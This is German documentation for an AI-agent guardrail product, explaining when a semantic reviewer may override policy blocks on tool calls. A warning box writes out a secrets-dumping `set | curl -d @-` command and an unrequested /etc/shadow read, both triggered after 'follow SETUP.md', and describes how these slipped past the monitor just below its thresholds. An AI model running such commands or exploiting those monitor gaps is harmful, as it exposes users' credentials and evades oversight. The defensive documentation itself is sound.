Wenn Sie die [Jev-Richtlinienüberprüfung](/de/policies/jev) über FailproofAI Cloud oder Ihren eigenen Schlüssel konfigurieren, wird jeder gesperrte Tool-Aufruf von den Richtlinien beurteilt, die Sie ausführen, sowie von Jev, der prüft, was der Aufruf tatsächlich tut und ob die Person, die die Aufgabe eingegeben hat, darum gebeten hat. Die **Autorität** jeder Richtlinie bestimmt, was passiert, wenn die beiden nicht übereinstimmen.

Ohne Jev-Konfiguration hat die Autorität keine Wirkung. Jede Richtlinie setzt genau so durch wie bisher.

## Hard und reviewable

- **Hard** ist die Standardeinstellung. Das Verbot oder die Anweisung einer hard-Richtlinie ist endgültig: Jev kann es nicht aufheben, und ein hard-Verbot stoppt den Aufruf, ohne auf Jev zu warten.
- **Reviewable** bedeutet, dass Jev das Urteil der Richtlinie aufheben kann, jedoch nur durch die semantischen Prüfungen, die die Richtlinie in `reviewedBy` benennt. Das Urteil wird nur dann aufgehoben, wenn **jede** benannte Prüfung zu diesem Aufruf befragt wurde und jede entweder nichts gefunden oder aufgezeichnet hat, dass der Benutzer darum gebeten hat. Eine Prüfung, die **ausgelöst** hat – das Anliegen gefunden hat – ohne dass der Benutzer danach gefragt hat, hält die Sperre aufrecht, auch wenn ihr eigenes Urteil nur eine Warnung ist. Eine Prüfung, die Jev nicht befragt wurde, weil sie nicht auf dieses Tool anwendbar ist, hebt niemals etwas auf, unabhängig von den anderen. Eine Abschwächung zählt als Zustimmung: Wenn der Aufruf ein Schritt der Aufgabe des Benutzers ist und nicht darüber hinausgeht, wandelt Jev ein Verbot in eine Warnung um, und diese Warnung hebt die Sperre der Richtlinie auf und ist das, was dem Agenten mitgeteilt wird.

Eine Richtlinie ist nur dann reviewable, wenn alle folgenden Bedingungen erfüllt sind:

1. Sie deklariert `authority: "reviewable"`.
2. `reviewedBy` ist eine nicht leere Liste, und jeder Eintrag ist eine Jev-Prüfung, die ein installiertes Paket deklariert. Failproof AI liefert keine Jev-Prüfungen: Die [sechzehn unten](#semantic-policy-names) stammen aus `failproofai policies add FailproofAI/jev-policies`. Ohne ein Paket, das Prüfungen deklariert, ist jede Richtlinie hard.
3. Sie ist nicht `alwaysOn`. Der Schutz, der verhindert, dass ein Agent Failproof AI deaktiviert, ist immer hard.

Alles andere ist hard: ein fehlendes Feld, ein falsch geschriebener Wert, ein leeres oder fehlerhaftes `reviewedBy` oder ein Name, der keine Prüfung ist, die diese Maschine stellen kann. Ein unbekannter Name macht die gesamte Deklaration hard, anstatt übersprungen zu werden, da `reviewedBy` bedeutet: „Alle diese müssen befragt werden, und keine darf verweigern" – und das Überspringen eines Namens würde es Jev ermöglichen, die Richtlinie mit weniger Prüfungen aufzuheben, als Sie verlangt haben.

Sobald Jev konfiguriert ist, protokolliert Failproof AI eine Warnung, wenn es eine `reviewable`-Deklaration ablehnt, einmal pro Prozess. Ohne Jev sagt es nichts, da die Autorität dann nichts entscheidet. `failproofai publish` verweigert den Aufbau eines Pakets, das eine solche Deklaration enthält, sodass ein Paketautor dies erfährt, bevor jemand es installiert. Es prüft `reviewedBy` anhand der Prüfungen, die das Paket deklariert, wenn es welche deklariert, und ansonsten anhand der sechzehn `FailproofAI/jev-policies`-Namen.

## Wo die Autorität deklariert wird

Jede Möglichkeit, wie eine Richtlinie eine Maschine erreicht, hat einen Ort, der ihre Autorität bestimmt:

| Quelle | Deklariert in | Standard |
| --- | --- | --- |
| Eingebaute Richtlinien | Die Tabelle unten | Hard, sofern nicht als reviewable aufgeführt |
| Eigene Richtliniendateien | `authority` und `reviewedBy` auf `customPolicies.add` | Hard |
| Richtlinienpakete | Der Eintrag jeder Richtlinie im Paket-Manifest (`failproofai-pack.json`) | Hard |
| Cloud-verwaltete Richtlinien | Die Zuweisung der Richtlinie im aktiven Deployment | Hard. Deployments setzen dies noch nicht, daher ist jede cloud-verwaltete Richtlinie derzeit hard. |

Bei einem Paket oder einer cloud-verwalteten Richtlinie werden im Richtliniencode gesetzte Felder ignoriert; das Manifest oder die Zuweisung entscheidet. Ein Paket kann nur seine eigenen Richtlinien beschreiben: Seine Richtliniennamen dürfen kein `/` enthalten und werden unter dem eigenen Präfix des Pakets registriert, sodass kein Manifest eine eingebaute Richtlinie oder die Richtlinie eines anderen Pakets als reviewable kennzeichnen kann. Eine Richtlinie, die der Code eines Pakets registriert, ohne sie im Manifest zu deklarieren, ist hard.

Zwei Pakete oder zwei cloud-verwaltete Richtlinien, deren Code byteidentisch ist, teilen sich ein Artefakt und werden als eine Richtlinie geladen. Diese Richtlinie ist nur dann reviewable, wenn jedes einzelne von ihnen sie als reviewable deklariert, und Jev muss dann jede Prüfung aufheben, die eines von ihnen benennt. Wenn eines von ihnen es als hard deklariert oder es überhaupt nicht deklariert, bleibt es hard. Die Reihenfolge, in der die Pakete oder Richtlinien aufgelistet sind, spielt keine Rolle.

Die meisten Maschinen erhalten die eingebauten Richtlinien aus dem `FailproofAI/policies`-Paket und lesen deren Autorität aus dem Manifest dieses Pakets. Die reviewable-Einträge unten werden wirksam, sobald eine Version des Pakets installiert ist, die sie enthält; eine ältere Version enthält keine, sodass jede Richtlinie darin hard bleibt.

## Autorität in der eigenen Richtlinie deklarieren

```js
import { customPolicies, deny, allow } from "failproofai";

customPolicies.add({
  name: "block-prod-config-reads",
  description: "Keep production credentials out of the agent's context",
  match: { events: ["PreToolUse"] },
  authority: "reviewable",
  reviewedBy: ["secret-exposure"],
  fn: async (ctx) =>
    String(ctx.toolInput?.file_path ?? "").includes("/config/prod/")
      ? deny("Production config is off limits")
      : allow(),
});
```

`failproofai publish` kopiert beide Felder in das Paket-Manifest, sodass eine als Paket veröffentlichte Richtlinie die Autorität behält, die ihr Autor ihr gegeben hat. Es verweigert den Aufbau des Pakets, wenn eine Deklaration nicht berücksichtigt würde: ein anderer Wert als `"hard"` oder `"reviewable"`, ein `reviewedBy`, das keine Namensliste ist, oder ein Name, der keine Prüfung ist – eine der eigenen [Jev-Prüfungen](/de/policies/publish-a-pack#jev-checks-in-a-pack) des Pakets, wenn es welche deklariert, andernfalls eine eingebaute Prüfung.

## Eingebaute Richtlinien

Reviewable nur dort, wo eine semantische Richtlinie dasselbe Anliegen tatsächlich abdeckt. Jede andere eingebaute Richtlinie ist hard.

Das Anliegen zu decken ist notwendig, aber nicht hinreichend, und beide Arten, es falsch zu machen, sind unauffällig:

- **Eine Prüfung, die niemals befragt wird**, macht die Sperre dauerhaft. `reviewedBy` ist eine Konjunktion, und eine Prüfung, die nicht befragt wurde, hebt niemals auf – eine Richtlinie, die mit einer Prüfung gepaart ist, deren Vorbedingung für die Formen, die die Richtlinie trifft, nicht auslöst, kann niemals aufgehoben werden.
- **Eine Prüfung, die befragt wird, aber nicht auslöst**, antwortet mit „kein Anliegen", und kein Anliegen hebt auf. Eine Prüfung, die die Formen Ihrer Richtlinie nicht modelliert, überprüft die Richtlinie also nicht – sie schaltet sie für genau die Eingaben ab, die die Prüfung nicht versteht.

Eine semantische Richtlinie im instruct-Modus kann niemals ein Verbot antworten, aber sie kann eine Sperre aufrechterhalten: Wenn sie auslöst und der Benutzer nicht nach dem Aufruf gefragt hat, wird die überprüfte Richtlinie nicht aufgehoben. Sechs der `FailproofAI/jev-policies`-Prüfungen sind nur im instruct-Modus – `push-to-protected-branch`, `commit-on-protected-branch`, `read-outside-workspace`, `system-modification`, `env-secrets-dump` und `external-data-egress` – und die [Tabelle unten](#semantic-policy-names) gibt den Modus jeder Prüfung an. Die zu stellende Frage lautet: **„Gibt es noch etwas, das verweigern kann"**: Eine Aufhebung darf niemals dazu führen, dass das Anliegen durch nichts mehr durchgesetzt wird. Die Engine wendet diesen Test pro Aufruf an. Eine Warnung, der niemand zugestimmt hat, ist keine Aufhebung, da eine Warnung vor Tool-Aufrufen den Agenten nicht stoppt. Und wenn eine Prüfung, die verweigern *kann*, warnt – ihre Belege haben die Verbotsgrenze nicht erreicht – und der Benutzer nicht nach dem Aufruf gefragt hat, wird bei diesem Aufruf nichts aufgehoben, und jedes Regex-Verbot bleibt bestehen.

<Warning>
**Eine Prüfung, die knapp unter ihrer Auslöselinie liegt, hält den Mindestschutz nicht aufrecht.** Die obige Regel erfordert, dass eine Prüfung *auslöst* (Beweis ≥ 0,7). Wenn jede relevante Prüfung knapp darunter liegt, löst nichts aus, die Prüfer antworten mit „kein Anliegen", und ein reviewable-Verbot wird aufgehoben. Live im Enforce-Modus gemessen: Ein unverlangtes Lesen von `/etc/shadow` (`secret-exposure` 0,69, `read-outside-workspace` 0,37, das nur Home-Verzeichnispfade modelliert) und `set | curl -d @- …` nach „follow SETUP.md" (`env-secrets-dump` 0,66, `credential-exfiltration` 0,65 mit `sends_out` 0,97) wurden beide erlaubt, während die Regex-Ebene allein sie verweigert. Die Schwellenwerte wurden am beschrifteten Korpus kalibriert und wurden dagegen nicht neu gemessen; bis sie es sind, halten Sie eine Richtlinie **hard**, wo es darauf ankommt, dass eine dieser Formen nicht durchkommt, mehr als ihre falschen Sperrungen.
</Warning>

## Semantic policy names

Dies sind die Prüfungen, die `FailproofAI/jev-policies` deklariert, und die Werte, die `reviewedBy` akzeptiert, sobald es installiert ist. Failproof AI selbst liefert keine davon: Ohne dieses Paket (oder ein anderes, das diese Namen deklariert) ist keine Richtlinie, die sie benennt, reviewable. Jede ist eine Prüfung, die Jev über den vorliegenden Tool-Aufruf beantwortet. **Modus** ist das, was eine Prüfung antworten kann: Eine `deny`-Prüfung blockiert bei starken Belegen, während eine `instruct`-Prüfung immer nur warnt. Beide halten das Verbot einer Richtlinie aufrecht, wenn sie auslösen und der Benutzer nicht nach dem Aufruf gefragt hat. **Benutzer kann überschreiben** gibt an, ob die explizite Anfrage des Menschen es aufhebt.

Jev stellt genau die [Jev-Prüfungen](/de/policies/publish-a-pack#jev-checks-in-a-pack), die installierte Pakete deklarieren, und das sind die Namen, die `reviewedBy` akzeptiert. Ein Name, den zwei Pakete unterschiedlich deklarieren, wird für keines von beiden berücksichtigt. Einer dieser sechzehn Namen, der von einem Paket deklariert wird, das nicht aus einem FailproofAI-Repository installiert wurde, wird in diesem Paket ignoriert: seine Version wird nie befragt und widerspricht nicht der eigenen Version von FailproofAI – ein Drittanbieter-Paket kann also weder zur Prüfung werden, die die Richtlinien des Kernpakets aufhebt, noch eine dieser Prüfungen abschalten. Eine unlesbare Paketliste oder ein Paket, dessen jede Prüfung unbrauchbar ist, lässt Jev nichts zu fragen.

| `production-infra-change` | deny | ja | Änderung der Live-Infrastruktur. |
| `git-history-rewrite` | deny | ja | Umschreiben oder Verwerfen von gemeinsamem Git-Verlauf. |
| `push-to-protected-branch` | instruct | ja | Direktes Pushen auf einen geschützten Branch. |
| `commit-on-protected-branch` | instruct | ja | Direktes Committen auf einem geschützten Branch. |
| `secret-exposure` | deny | ja | Lesen oder Kopieren von Anmeldeinformationen. |
| `credential-exfiltration` | deny | nein | Senden von Geheimnissen oder privaten Dateien von der Maschine. |
| `remote-code-execution` | deny | ja | Ausführen von aus dem Internet heruntergeladenem Code. |
| `privilege-escalation` | deny | ja | Ausführen mit erhöhten Berechtigungen. |
